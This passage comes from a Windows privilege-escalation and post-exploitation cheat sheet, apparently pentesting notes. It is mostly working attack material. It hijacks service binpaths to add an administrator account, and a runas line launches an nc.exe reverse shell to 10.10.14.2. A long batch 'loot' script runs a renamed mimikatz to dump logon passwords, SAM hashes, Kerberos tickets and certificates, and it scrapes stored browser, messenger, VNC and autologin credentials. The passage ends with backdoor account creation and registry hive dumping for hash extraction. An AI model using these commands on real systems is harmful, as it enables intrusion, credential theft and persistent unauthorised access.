accesschk.exe -uwcqv "Authenticated Users" * /accepteula - This command worked for XP
accesschk.exe -qdws "Authenticated Users" C:\Windows\ /accepteula
accesschk.exe -qdws Users C:\Windows\
```

If you found a vulnerable RW service from using accesschk:

```
sc config upnphost binpath= "net user rootuser r00ted123 /add"
sc config upnphost obj= ".\LocalSystem" password= ""
sc config upnphost depend= ""
```

Then proceed with restarting the service to execute the binpath command and add new user to administrators group:

```
sc start upnphost
sc config upnphost binpath= "net localgroup administrators rootuser /add"
sc config upnphost obj= ".\LocalSystem" password= ""
sc config upnphost depend= ""
sc start upnphost
```

Check for stored credentials:

```
cmdkey /list
```

If there are entries, it means that we may able to `runas` certain user who stored his credentials in windows:

```
runas /savecred /user:ACCESS\Administrator "c:\windows\system32\cmd.exe /c \IP\share\nc.exe -nv 10.10.14.2 80 -e cmd.exe"
```

Windows Exploits by Patch:

```
MS10-015
MS10-059
MS10-092
MS11-080
MS13-005
CVE-2013-3660
MS13-053
MS13-081
MS14-058
MS14-068
MS14-070
MS15-001
MS15-051
MS15-052
MS17-010 - [https://github.com/worawit/MS17-010/](https://github.com/worawit/MS17-010/)
```

Windows Enumeration Script:

```batch
@echo OFF
call:credits
call:CheckOSbitrate
call:CheckOSversion
call:checkprerequisitefiles

call:checkquickwins
call:getfirewallinformation
call:getcomputerinformation
call:dumphashespasseskerberoscerts
call:findinterestingfiles
call:findinterestingregistrykeys
call:findpasswords
call:checkweakpermissions
call:cleanup
goto end

:credits
echo.----------------------------------------------------
echo.Author: Jollyfrogs, Brisbane QLD
echo.A root loot script I used to learn batch techniquesP, needs TLC
echo.----------------------------------------------------
echo.
goto:eof

:CheckOSbitrate
IF DEFINED ProgramFiles(x86) (set OSbit=64) else (set OSbit=32)
goto:eof

:checkprerequisitefiles
REM SOME OF THESE COMMANDS MIGHT GENERATE ERRORS SO WE CATCH THEM ALL HERE
echo ====================================================================
echo ====================== IGNORE THESE ERRORS =========================
dir jollykatz%OSbit%.exe /a/s/b 1> nul 2> NUL
IF %ERRORLEVEL% == 0 set jollykatz=1
for /f "tokens=1 delims=" %%a in ('whoami') do set whoami=%%a
for /f "tokens=1 delims=" %%a in ('netsh /? ^| findstr \.*.irewal.*.*') do set netshfirewall=%%a

REM
REM check registry for the following registry entries:
REM
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated | Find "0x1" 1> NUL
IF %ERRORLEVEL% == 0 (
	reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated | Find "0x1" 1> NUL
	IF %ERRORLEVEL% == 0 (set alwaysinstallelevated=1)
)
reg query "HKCU\SOFTWARE\Microsoft\Protected Storage System Provider" /v "Protected Storage" 1>NUL
IF %ERRORLEVEL% == 0 (set IE6found=1)
reg query "HKCU\SOFTWARE\Microsoft\Internet Explorer\IntelliForms\Storage2" 1>NUL
IF %ERRORLEVEL% == 0 (set IE7found=1)
reg query "HKCU\SOFTWARE\America Online\AIM6\Passwords" 1>NUL
IF %ERRORLEVEL% == 0 (set AIM6found=1)
reg query "HKCU\SOFTWARE\AIM\AIMPRO" 1>NUL
IF %ERRORLEVEL% == 0 (set AIMPROfound=1)
reg query "HKCU\SOFTWARE\Beyluxe Messenger" 1>NUL
IF %ERRORLEVEL% == 0 (set BEYLUXEfound=1)
reg query "HKCU\SOFTWARE\BigAntSoft\BigAntMessenger\Setting" 1>NUL
IF %ERRORLEVEL% == 0 (set BIGANTfound=1)
reg query "HKCU\SOFTWARE\Camfrog\Client" 1>NUL
IF %ERRORLEVEL% == 0 (set CAMFROGfound=1)
reg query "HKCU\SOFTWARE\Google\Google Talk\Accounts" 1>NUL
IF %ERRORLEVEL% == 0 (set GOOGLETALKfound=1)
reg query "HKCU\SOFTWARE\IMVU" 1>NUL
IF %ERRORLEVEL% == 0 (set IMVUfound=1)
reg query "HKCU\SOFTWARE\Nimbuzz\PCClient\Application" 1>NUL
IF %ERRORLEVEL% == 0 (set NIMBUZZfound=1)
reg query "HKCU\SOFTWARE\Paltalk" 1>NUL
IF %ERRORLEVEL% == 0 (set PALTALKfound=1)
reg query "HKCU\SOFTWARE\Yahoo\Pager" 1>NUL
IF %ERRORLEVEL% == 0 (set YAHOOPAGERfound=1)
reg query "HKCU\SOFTWARE\IncrediMail" 1>NUL
IF %ERRORLEVEL% == 0 (set INCREDIMAILfound=1)
reg query "HKCU\SOFTWARE\Microsoft\Office\15.0\Outlook\Profiles\Outlook" 1>NUL
IF %ERRORLEVEL% == 0 (set OUTLOOK2013found=1)
reg query "HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows Messenging Subsystem\Profiles" 1>NUL
IF %ERRORLEVEL% == 0 (set OUTLOOK2010POSTNTfound=1)
reg query "HKCU\SOFTWARE\Microsoft\Windows Messenging Subsystem\Profiles" 1>NUL
IF %ERRORLEVEL% == 0 (set OUTLOOK2010PRENTfound=1)
reg query "HKCU\SOFTWARE\Microsoft\Office\Outlookt\OMI Account Manager\Accounts" 1>NUL
IF %ERRORLEVEL% == 0 (set OUTLOOK98MAILONLYfound=1)
reg query "HKCU\SOFTWARE\Microsoft\Internet Account Manager\Accounts" 1>NUL
IF %ERRORLEVEL% == 0 (set OUTLOOK98NORMALfound=1)
reg query "HKCU\SOFTWARE\Adobe\Common\10\Sites" 1>NUL
IF %ERRORLEVEL% == 0 (set DREAMWEAVERfound=1)
reg query "HKCU\SOFTWARE\Google\Google Desktop\Mailboxes\Gmail" 1>NUL
IF %ERRORLEVEL% == 0 (set GMAILDESKTOPfound=1)
reg query "HKCU\SOFTWARE\DownloadManager\Passwords" 1>NUL
IF %ERRORLEVEL% == 0 (set IDMfound=1)
reg query "HKCU\SOFTWARE\Google\Picasa" 1>NUL
IF %ERRORLEVEL% == 0 (set PICASAfound=1)
reg query HKLM\SOFTWARE\RealVNC\vncserver /v Password | Find "Password" 1> NUL
IF %ERRORLEVEL% == 0 (set realvncpassfound=1)
reg query HKLM\Software\TightVNC\Server /v Password | Find "Password" 1> NUL
IF %ERRORLEVEL% == 0 (set tightvncpassfound1=1)
reg query HKLM\Software\TightVNC\Server /v PasswordViewOnly | Find "PasswordViewOnly" 1> NUL
IF %ERRORLEVEL% == 0 (set tightvncpassfound2=1)
reg query HKLM\Software\TigerVNC\WinVNC4 /v Password | Find "Password" 1> NUL
IF %ERRORLEVEL% == 0 (set tigervncpassfound=1)
reg query HKLM\SOFTWARE\ORL\WinVNC3\Default /v Password | Find "Password" 1> NUL
IF %ERRORLEVEL% == 0 (set vnc3passfound1=1)
reg query HKLM\SOFTWARE\ORL\WinVNC3 /v Password | Find "Password" 1> NUL
IF %ERRORLEVEL% == 0 (set vnc3passfound2=1)
reg query HKCU\Software\ORL\WinVNC3 /v Password | Find "Password" 1> NUL
IF %ERRORLEVEL% == 0 (set vnc3passfound3=1)
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" /v DefaultPassword | Find "DefaultPassword" 1> NUL
IF %ERRORLEVEL% == 0 (
	For /F "Tokens=2*" %%a In ('reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" /v DefaultPassword') Do set defaultloginpass=%%b	
	REM we check if the registry key is not null
	IF NOT [%defaultloginpass%] == [] set winautologinpassfound=1
	set defaultloginpass=
)
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" /v DefaultUsername | Find "DefaultUsername" 1> NUL
IF %ERRORLEVEL% == 0 (set winautologinuserfound=1)
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" /v DefaultDomainname | Find "DefaultDomainname" 1> NUL
IF %ERRORLEVEL% == 0 (set winautologindomainfound=1)
REM
REM
echo ====================== IGNORE THESE ERRORS =========================
echo ====================================================================
echo.
goto:eof

:CheckOSVersion
@echo off
ver | find "2003" > nul
if %ERRORLEVEL% == 0 goto ver_2003
ver | find "XP" > nul
if %ERRORLEVEL% == 0 goto ver_xp
ver | find "2000" > nul
if %ERRORLEVEL% == 0 goto ver_2000
ver | find "NT" > nul
if %ERRORLEVEL% == 0 goto ver_nt
if not exist %SystemRoot%\system32\systeminfo.exe goto versioncheckwarnthenexit
systeminfo | find "OS Name" > %TEMP%\osname.txt
FOR /F "usebackq delims=: tokens=2" %%i IN (%TEMP%\osname.txt) DO set vers=%%i
echo %vers% | find "Windows 7" > nul
if %ERRORLEVEL% == 0 goto ver_7
echo %vers% | find "Windows Server 2008" > nul
if %ERRORLEVEL% == 0 goto ver_2008
echo %vers% | find "Windows Vista" > nul
if %ERRORLEVEL% == 0 goto ver_vista
goto warnthenexit
:ver_7
:Run Windows 7 specific commands here.
set OSVersion=WIN7
goto versioncheckexit
:ver_2008
:Run Windows Server 2008 specific commands here.
set OSVersion=WIN2008
goto versioncheckexit
:ver_vista
:Run Windows Vista specific commands here.
set OSVersion=WINVISTA
goto versioncheckexit
:ver_2003
:Run Windows Server 2003 specific commands here.
set OSVersion=WIN2003
goto versioncheckexit
:ver_xp
:Run Windows XP specific commands here.
set OSVersion=WINXP
goto versioncheckexit
:ver_2000
:Run Windows 2000 specific commands here.
set OSVersion=WIN2000
goto versioncheckexit
:ver_nt
:Run Windows NT specific commands here.
set OSVersion=WINNT
goto versioncheckexit
:versioncheckwarnthenexit
set OSVersion=UNDETERMINED
goto:versioncheckexit
:versioncheckexit
goto:eof

:checkquickwins
	systeminfo > systeminfo.txt
	REM === Generic tests across all Windows versions here
	IF DEFINED alwaysinstallelevated (
		echo **** !!! VULNERABLE TO ALWAYSINSTALLELEVATED !!! ****
		set alwaysinstallelevated=
		echo.
	)
	IF DEFINED realvncpassfound (
		echo **** !!! REALVNC PASS FOUND !!! ****
		reg query HKLM\SOFTWARE\RealVNC\vncserver /v Password | Find "Password"
		echo ************************************
		set realvncpassfound=
		echo.
	)
	IF DEFINED tightvncpassfound1 (
		echo **** !!! TIGHTVNC PASS FOUND !!! ****
		reg query HKLM\Software\TightVNC\Server /v Password | Find "Password"
		echo *************************************
		set tightvncpassfound1=
		echo.
	)
	IF DEFINED tightvncpassfound2 (
		echo **** !!! TIGHTVNC VIEWONLY PASS FOUND !!! ****
		reg query HKLM\Software\TightVNC\Server /v PasswordViewOnly | Find "PasswordViewOnly"
		echo **********************************************
		set tightvncpassfound2=
		echo.
	)
	IF DEFINED tigervncpassfound (
		echo **** !!! TIGERVNC PASS FOUND !!! ****
		reg query HKLM\Software\TigerVNC\WinVNC4 /v Password | Find "Password"
		echo *************************************
		set tigervncpassfound=
		echo.
	)
	IF DEFINED vnc3passfound1 (
		echo **** !!! VNC3 PASS FOUND !!! ****
		reg query HKLM\SOFTWARE\ORL\WinVNC3\Default /v Password | Find "Password"
		echo *********************************
		set vnc3passfound1=
		echo.
	)
	IF DEFINED vnc3passfound2 (
		echo **** !!! VNC3 PASS FOUND !!! ****
		reg query HKLM\SOFTWARE\ORL\WinVNC3 /v Password | Find "Password"
		echo *********************************
		set vnc3passfound2=
		echo.
	)
	IF DEFINED vnc3passfound3 (
		echo **** !!! VNC3 PASS FOUND !!! ****
		reg query HKCU\Software\ORL\WinVNC3 /v Password | Find "Password"
		echo *********************************
		set vnc3passfound3=
		echo.
	)
	IF DEFINED winautologinpassfound (
		echo **** !!! WINDOWS AUTOLOGIN PASS FOUND !!! ****
		reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" /v DefaultPassword | Find "DefaultPassword"
		echo **********************************************

		IF DEFINED Winautologinuserfound (
			reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" /v DefaultUsername | Find "DefaultUsername"
			set winautologinuserfound=
		)

		IF DEFINED winautologindomainfound (
			reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" /v DefaultDomainname | Find "DefaultDomainname"
			set winautologindomainfound=
		)

		set winautologinpassfound=
	)
goto:eof
	if %OSVersion%==WINXP (
		REM Maybe we can do something nice with this, haven't found a really good use yet other than it does work, too many KB's and interdependencies on KB patches
		REM for /f "tokens=1 delims=" %%a in ('type systeminfo.txt ^| findstr /C:"KB147222"') do set MYKB=%%a
		REM if NOT DEFINED MYKB echo == VULNERABLE TO KBasfjsdfj
		REM set MYKB=
		REM echo.
	)
goto:eof

:getfirewallinformation
echo.
IF DEFINED netshfirewall (
		echo.
		echo.Firewall Status
		echo.---------------
		netsh firewall show state
		echo.
		echo.
		echo.Firewall configuration details
		echo.------------------------------
		echo.
		netsh firewall show config
		echo.
	) ELSE (
		echo === NOTE: The netsh firewall command was not found, skipping checks ===
	)
echo.
goto:eof

:getcomputerinformation
echo.
echo.This computer is running %OSbit%-bit Windows
echo.
IF DEFINED whoami (
	echo.
	echo.Are we running an elevated command prompt?
	echo.------------------------------------------
	for /f "tokens=1 delims=" %%a in ('whoami /groups ^| findstr \.*High.Man') do set runningelevatedprompt=%%a
		IF DEFINED runningelevatedprompt (
				echo YES, we ARE!
			) ELSE (
				echo Sadly, no...
			)
		echo.
		echo.User Groups
		echo.-----------
		whoami /groups
		echo.
	) ELSE (
		echo === NOTE: The whoami command was not found, skipping checks ===
	)
echo.
echo.User Accounts
echo.-------------
net users
echo.
echo.Systeminfo
echo.----------
systeminfo
echo.
echo.Netstat -ano
echo.------------
netstat -ano
echo.
echo.Scheduled tasks
echo.---------------
schtasks /query /fo LIST /v
echo.
echo.Task to service mapping
echo.-----------------------
tasklist /SVC
echo.
echo.Network settings
echo.----------------
ipconfig /all
echo.
echo.Running windows services
echo.------------------------
net start
echo.
echo.Listing Windows drivers
echo.-----------------------
DRIVERQUERY
echo.
echo.Dumping Windows registry to registrydump.txt
echo.--------------------------------------------
reg query HKLM /s > registrydump.txt
reg query HKCU /s >> registrydump.txt
echo.
echo.Environment variables
echo.---------------------
set
echo.
echo.Group Policy
echo.------------
gpresult /R 1>2>NUL
IF %ERRORLEVEL% == 1 (
	REM WINXP
	gpresult
) ELSE (
	REM WIN7
	gpresult /R
)
echo.
REM ** ALEX TO ADD CREDENUMERATE **
goto:eof

:dumphashespasseskerberoscerts
echo.Hashes, passwords, kerberos tickets and certificates
echo.-----------------
IF NOT DEFINED jollykatz echo === NOTE: Jollykatz%OSbit%.exe not found, skipping jollykatz checks ===
IF NOT DEFINED jollykatz goto:eof
echo.
echo.sekurlsa::logonPasswords full
echo.------
jollykatz%OSbit%.exe "privilege::debug" "sekurlsa::logonPasswords full" "exit"
echo.
echo.lsadump::sam
echo.------
jollykatz%OSbit%.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
echo.
echo.sekurlsa::tickets /export
echo.------
jollykatz%OSbit%.exe "privilege::debug" "token::elevate" "sekurlsa::tickets /export" "exit"
echo.
echo.crypto::certificates /export (CERT_SYSTEM_STORE_CURRENT_USER)
echo.------
jollykatz%OSbit%.exe "privilege::debug" "token::elevate" "crypto::capi" "crypto::cng" "crypto::certificates /systemstore:CERT_SYSTEM_STORE_CURRENT_USER /store:my /export" "exit"
echo.
echo.crypto::certificates /export (CERT_SYSTEM_STORE_LOCAL_MACHINE)
echo.------
jollykatz%OSbit%.exe "privilege::debug" "token::elevate" "crypto::capi" "crypto::cng" "crypto::certificates /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE /store:my /export" "exit"
echo.
echo.crypto::certificates /export (CERT_SYSTEM_STORE_LOCAL_MACHINE_ENTERPRISE)
echo.------
jollykatz%OSbit%.exe "privilege::debug" "token::elevate" "crypto::capi" "crypto::cng" "crypto::certificates /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE_ENTERPRISE /store:my /export" "exit"
echo.
echo.crypto::certificates /export (CERT_SYSTEM_STORE_USERS)
echo.------
jollykatz%OSbit%.exe "privilege::debug" "token::elevate" "crypto::capi" "crypto::cng" "crypto::certificates /systemstore:CERT_SYSTEM_STORE_USERS /store:my /export" "exit"
echo.
goto:eof

:findinterestingfiles
echo.Interesting files and directories
echo.---------------------------------
dir C:\* /a/s/b > dirlisting.txt
type dirlisting.txt | findstr /I \.*proof[.]txt$
type dirlisting.txt | findstr /I \.*network-secret[.]txt$
type dirlisting.txt | findstr /I \.*ssh.*[.]ini$
type dirlisting.txt | findstr /I \.*ultravnc[.]ini$
type dirlisting.txt | findstr /I \.*vnc[.]ini$
type dirlisting.txt | findstr /I \.*bthpan[.]sys$
type dirlisting.txt | findstr /I \.*\\repair$
type dirlisting.txt | findstr /I \.*passw*. | findstr /VI \.*.chm$ | findstr /VI \.*.log$ | findstr /VI \.*.dll$ | findstr /VI \.*.exe$
type dirlisting.txt | findstr /I \.*[.]vnc$
type dirlisting.txt | findstr /I \.*groups[.]xml$
type dirlisting.txt | findstr /I \.*printers[.]xml$
type dirlisting.txt | findstr /I \.*drives[.]xml$
type dirlisting.txt | findstr /I \.*scheduledtasks[.]xml$
type dirlisting.txt | findstr /I \.*services[.]xml$
type dirlisting.txt | findstr /I \.*datasources[.]xml$
type dirlisting.txt | findstr /I \.*.rsa.*[.].*$ | findstr /VI \.*.dll$ | findstr /VI \.*.rat$
type dirlisting.txt | findstr /I \.*.dsa.*[.].*$ | findstr /VI \.*.dll$ | findstr /VI \.*.exe$ | findstr /VI \.*.gif$ | findstr /VI \.*.handsafe[.]reg$
type dirlisting.txt | findstr /I \.*[.]dbx$
type dirlisting.txt | findstr /I \.*.account.*.$ | findstr /VI \.*.User.Account.Picture.*. | findstr /VI \.*.bmp$
type dirlisting.txt | findstr /I \.*ntds[.].*$
type dirlisting.txt | findstr /I \.*hiberfil[.].*$
type dirlisting.txt | findstr /I \.*boot[.]ini$
type dirlisting.txt | findstr /I \.*win[.]ini$
type dirlisting.txt | findstr /I \.*.\\config\\RegBack
type dirlisting.txt | findstr /I \.*.\\CCM\\logs
type dirlisting.txt | findstr /I \.*.\\iis.[.]log$
type dirlisting.txt | findstr /I \.*.\\Content.IE.\\index.dat$
type dirlisting.txt | findstr /I \.*.\\inetpub\\logs\\LogFiles
type dirlisting.txt | findstr /I \.*.\\httperr\\httpe.*.[.]log$
type dirlisting.txt | findstr /I \.*.\\logfiles\\w3svc1\\ex.*.[.]log$
type dirlisting.txt | findstr /I \.*.\\Panther\\ | findstr /VI \.*.Resources\\Themes\\.*.
type dirlisting.txt | findstr /I \.*.syspre.*,[.]...$
type dirlisting.txt | findstr /I \.*.unatten.*.[.]txt$
type dirlisting.txt | findstr /I \.*.unatten.*.[.]xml$
type dirlisting.txt | findstr /I \.*Login.Data$
type dirlisting.txt | findstr /I \.*Web.Data$
type dirlisting.txt | findstr /I \.*Credentials.Store$
type dirlisting.txt | findstr /I \.*Credential.Store$
type dirlisting.txt | findstr /I \.*Microsoft\\Credentials.*
REM Avant Browser:
type dirlisting.txt | findstr /I \.*forms[.]dat[.]vdt$
type dirlisting.txt | findstr /I \.*default\\formdata\\forms[.]dat$
REM Comodo Dragon
type dirlisting.txt | findstr /I \.*Dragon\\User.Data\\Default.*
REM CoolNovo
type dirlisting.txt | findstr /I \.*ChromePlus\\User.Data\\Default.*
REM Firefox
type dirlisting.txt | findstr /I \.*Firefox\\Profiles\\.*[.]default$
type dirlisting.txt | findstr /I \.*key3[.]db$
REM Flock Browser
type dirlisting.txt | findstr /I \.*Flock\\User.Data\\Default.*
REM Google Chrome
type dirlisting.txt | findstr /I \.*Chrome\\User.Data\\Default.*
type dirlisting.txt | findstr /I \.*Chrome.SXS\\User.Data\\Default.*
REM Internet Explorer
type dirlisting.txt | findstr /I \.*Microsoft\\Credentials.*
REM Maxthon
type dirlisting.txt | findstr /I \.*MagicFill.*
type dirlisting.txt | findstr /I \.*MagicFill2[.]dat$
REM Opera
type dirlisting.txt | findstr /I \.*Wand[.]dat$
REM Safari
type dirlisting.txt | findstr /I \.*keychain[.]plist$
REM SeaMonkey
type dirlisting.txt | findstr /I \.*signons[.]sqlite$
REM AIM
type dirlisting.txt | findstr /I \.*aimx[.]bin$
REM Digsby
type dirlisting.txt | findstr /I \.*logininfo[.]yaml$
type dirlisting.txt | findstr /I \.*digsby[.]dat$
REM Meebo Notifier
type dirlisting.txt | findstr /I \.*MeeboAccounts[.]txt$
REM Miranda IM
type dirlisting.txt | findstr /I \.*Miranda\\.*[.]dat$
REM MySpace IM
type dirlisting.txt | findstr /I \.*MySpace\\IM\\users[.]txt$
REM Pidgin
type dirlisting.txt | findstr /I \.*Accounts[.]xml$
REM Skype
type dirlisting.txt | findstr /I \.*Skype.*config[.]xml$
REM Tencent QQ
type dirlisting.txt | findstr /I \.*Registry[.]db$
REM Trillian
type dirlisting.txt | findstr /I \.*accounts[.]ini$
REM XFire
type dirlisting.txt | findstr /I \.*XfireUser[.]ini$
REM Foxmail
type dirlisting.txt | findstr /I \.*Account[.]stg$
type dirlisting.txt | findstr /I \.*Accounts[.]tdat$
REM ThunderBird
type dirlisting.txt | findstr /I \.*signons[.]sqlite$
REM Windows Live Mail
type dirlisting.txt | findstr /I \.*[.]oeaccount$
REM FileZilla
type dirlisting.txt | findstr /I \.*recentservers[.]xml$
REM FlashFXP
type dirlisting.txt | findstr /I \.*Sites[.]dat$
REM FTPCommander
type dirlisting.txt | findstr /I \.*Ftplist[.]txt$
REM SmartFTP
type dirlisting.txt | findstr /I \.*SmartFTP.*[.]xml$
REM WS_FTP
type dirlisting.txt | findstr /I \.*ws_ftp[.]ini$
REM Heroes of Newerth
type dirlisting.txt | findstr /I \.*login[.]cfg$
REM JDownloader
type dirlisting.txt | findstr /I \.*JDownloader.*
type dirlisting.txt | findstr /I \.*database[.]script$
type dirlisting.txt | findstr /I \.*accounts[.]ejs$
REM OrbitDownloader
type dirlisting.txt | findstr /I \.*sitelogin[.]dat$
REM Seesmic
type dirlisting.txt | findstr /I \.*data[.]db$
REM SuperPutty
type dirlisting.txt | findstr /I \.*sessions[.]xml$
REM TweetDeck
type dirlisting.txt | findstr /I \.*TweetDeck.*
type dirlisting.txt | findstr /I \.*[.]localstorage$
echo.
goto:eof

:findinterestingregistrykeys
REM Source: securityxploded dot com slash passwordsecrets dot php
IF EXIST AIM6found (reg query "HKCU\SOFTWARE\America Online\AIM6\Passwords")
IF EXIST AIMPROfound (reg query "HKCU\SOFTWARE\AIM\AIMPRO")
IF EXIST IE6found (reg query "HKCU\SOFTWARE\Microsoft\Protected Storage System Provider" /v "Protected Storage")
IF EXIST IE7found (reg query "HKCU\SOFTWARE\Microsoft\Internet Explorer\IntelliForms\Storage2")
IF EXIST BEYLUXEfound (reg query "HKCU\SOFTWARE\Beyluxe Messenger")
IF EXIST BIGANTfound (reg query "HKCU\SOFTWARE\BigAntSoft\BigAntMessenger\Setting")
IF EXIST CAMFROGfound (reg query "HKCU\SOFTWARE\Camfrog\Client")
IF EXIST GOOGLETALKfound (reg query "HKCU\SOFTWARE\Google\Google Talk\Accounts")
IF EXIST IMVUfound (reg query "HKCU\SOFTWARE\IMVU")
IF EXIST NIMBUZZfound (reg query "HKCU\SOFTWARE\Nimbuzz\PCClient\Application")
IF EXIST PALTALKfound (reg query "HKCU\SOFTWARE\Paltalk")
IF EXIST YAHOOPAGERfound (reg query "HKCU\SOFTWARE\Yahoo\Pager")
IF EXIST INCREDIMAIL (reg query "HKCU\SOFTWARE\IncrediMail")
IF EXIST OUTLOOK2013found (reg query "HKCU\SOFTWARE\Microsoft\Office\15.0\Outlook\Profiles\Outlook")
IF EXIST OUTLOOK2010POSTNTfound (reg query "HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows Messenging Subsystem\Profiles")
IF EXIST OUTLOOK2010PRENTfound (reg query "HKCU\SOFTWARE\Microsoft\Windows Messenging Subsystem\Profiles")
IF EXIST OUTLOOK98MAILONLYfound (reg query "HKCU\SOFTWARE\Microsoft\Office\Outlookt\OMI Account Manager\Accounts")
IF EXIST OUTLOOK98NORMALfound (reg query "HKCU\SOFTWARE\Microsoft\Internet Account Manager\Accounts")
IF EXIST DREAMWEAVERfound (reg query "HKCU\SOFTWARE\Adobe\Common\10\Sites")
IF EXIST GMAILDESKTOPfound (reg query "HKCU\SOFTWARE\Google\Google Desktop\Mailboxes\Gmail")
IF EXIST IDMfound (reg query "HKCU\SOFTWARE\DownloadManager\Passwords")
IF EXIST PICASAfound (reg query "HKCU\SOFTWARE\Google\Picasa")
REM

:findpasswords
echo.Searching for passwords (this can take a while)
echo.-----------------------------------------------
findstr /si pwd= *.xml *.ini *.txt
findstr /si password= *.xml *.ini *.txt
findstr /si pass= *.xml *.ini *.txt
goto:eof

:checkweakpermissions
echo.Searching for weak service permissions (this can take a while)
echo.--------------------------------------------------------------
if exist serviceexes.txt del serviceexes.txt
if exist dirlisting.txt del dirlisting.txt
dir \ /a/s/b > dirlisting.txt
for /f "tokens=1 delims=," %%a in ('tasklist /SVC /FO CSV ^| findstr /I \.*exe*. ^| findstr /VI "smss.exe csrss.exe winlogon.exe services.exe spoolsv.exe explorer.exe ctfmon.exe wmiprvse.exe msmsgs.exe notepad.exe lsass.exe svchost.exe findstr.exe cmd.exe tasklist.exe"') do (findstr %%a$ | findstr /VI "\.*winsxs\\*.") <dirlisting.txt >> serviceexes.txt
REM In the line below we parse serviceexes.txt and check each line for write access. We check write access by appending (writing) nothing to the file, we then use batch logic to test results and output results in echo
REM for /f "tokens=*" %%a in (serviceexes.txt) do 2>nul (>>%%a echo off) && (echo === !!! RW access to service executable: %%a !!! ===) || (call)
REM Ninja magic to find out if we have write access, only partially reliable so decided to go with cacls instead
REM @echo off & 2>nul (>>"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" echo off) && (echo RW access) || (echo no RW access) & echo on

for /f "tokens=*" %%a in (serviceexes.txt) do (cacls "%%a"|findstr /I "Users:"|findstr /I "W F") && (echo === !!! Write access to service executable: %%a !!! ===) || (call)
for /f "tokens=*" %%a in (serviceexes.txt) do (cacls "%%a"|findstr /I "Everyone"|findstr /I "W F") && (echo === !!! Write access to service executable: %%a !!! ===) || (call)

echo.Files and folder with Read-Write access
echo.---------------------------------------
dir accesschk.exe /a/s/b 1>2>NUL
IF %ERRORLEVEL% == 0 (
	echo === NOTE: accesschk.exe not found, skipping accesschk file permissions checks ===
	goto:eof
)

	accesschk.exe /accepteula 1>2>NUL
	
	accesschk.exe -uwqs "Everyone" c:\*.* | findstr /VI "\.*system32\\Setup*. \.*system32\\spool\\PRINTERS*. \.*Registration\\CRMLog*. \.*Debug\\UserMode*. \.*WINDOWS\\Tasks*. \.*WINDOWS\\Temp*. \.*Documents.And.Settings*. \.*RECYCLER*. \.*System.Volume.Information*."
	accesschk.exe -uwqs "Users" c:\*.* | findstr /VI "\.*system32\\Setup*. \.*system32\\spool\\PRINTERS*. \.*Registration\\CRMLog*. \.*Debug\\UserMode*. \.*WINDOWS\\Tasks*. \.*WINDOWS\\Temp*. \.*Documents.And.Settings*. \.*RECYCLER*. \.*System.Volume.Information*."
	accesschk.exe -uwqs "Authenticated Users" c:\*.*  | findstr /VI \.*System.Volume.Information*. | findstr /VI \.*Documents.And.Settings*.
	
	echo.Searching for weak service permissions
	echo.--------------------------------------
	accesschk.exe -uwcqv "Authenticated Users" * | Find "RW " 1> NUL
	if %ERRORLEVEL% == 0 (
		echo.**** !!! VULNERABLE SERVICES FOUND - Authenticated Users!!! ****
		accesschk.exe -uwcqv "Authenticated Users" *
		echo.****************************************************************
		echo.
	)
	accesschk.exe /accepteula 1>2>NUL
	accesschk.exe -uwcqv "Users" * | Find "RW " 1> NUL
	if %ERRORLEVEL% == 0 (
		echo.**** !!! VULNERABLE SERVICES FOUND - All Users !!! ****
		accesschk.exe -uwcqv "Users" *
		echo.*******************************************************
		echo.To plant binary in service use:
		echo.sc config [service_name] binpath= "C:\rshell.exe"
		echo.sc config [service_name] obj= ".\LocalSystem" password= ""
		echo.sc qc [service_name] (to verify!)
		echo.net start [service_name]
		echo.*******************************************************
	)
	accesschk.exe /accepteula 1>2>NUL
	accesschk.exe -uwcqv "Everyone" * | Find "RW " 1> NUL
	if %ERRORLEVEL% == 0 (
		echo.**** !!! VULNERABLE SERVICES FOUND - Everyone !!! ****
		accesschk.exe -uwcqv "Everyone" *
		echo.*******************************************************
		echo.To plant binary in service use:
		echo.sc config [service_name] binpath= "C:\rshell.exe"
		echo.sc config [service_name] obj= ".\LocalSystem" password= ""
		echo.sc qc [service_name] (to verify!)
		echo.net start [service_name]
		echo.*******************************************************
goto:eof

:cleanup
set jollykatz=
set accesschk=
set OSbit=
set whoami=
set runningelevatedprompt=
set netshfirewall=
set OSVersion=
set alwaysinstallelevated=
set realvncpassfound=
set tightvncpassfound1=
set tightvncpassfound2=
set tigervncpassfound=
set vnc3passfound1=
set vnc3passfound2=
set vnc3passfound3=
set winautologinpassfound=
set winautologindomainfound=
set winautologinuserfound=
set defaultloginpass=
set IE6found=
set IE7found=
set AIM6found=
set AIMPROfound=
set BEYLUXEfound=
set BIGANTfound=
set CAMFROGfound=
set GOOGLETALKfound=
set IMVUfound=
set NIMBUZZfound=
set PALTALKfound=
set YAHOOPAGERfound=
set INCREDIMAILfound=
set OUTLOOK2013found=
set OUTLOOK2010POSTNTfound=
set OUTLOOK2010PRENTfound=
set OUTLOOK98MAILONLYfound=
set OUTLOOK98NORMALfound=
goto:eof

:end
echo.
echo.==============
echo.Dump complete!
echo.==============
GOTO:eof
```

***

## Windows Post Exploitation

### Quickly create account with RDP access

```
net user offsec password1 /add
net localgroup Administrators offsec /add
net localgroup "Remote Desktop Users" offsec /add
```

### Loot registry without tools

This might be a better technique than using tools like `wce` and `fgdump`, since you don't have to upload any binaries. Get the registry:

```
C:\> reg.exe save hklm\sam c:\windows\temp\sam.save
C:\> reg.exe save hklm\security c:\windows\temp\security.save
C:\> reg.exe save hklm\system c:\windows\temp\system.save
```

The hashes can be extracted using `secretdump.py` or `pwdump`
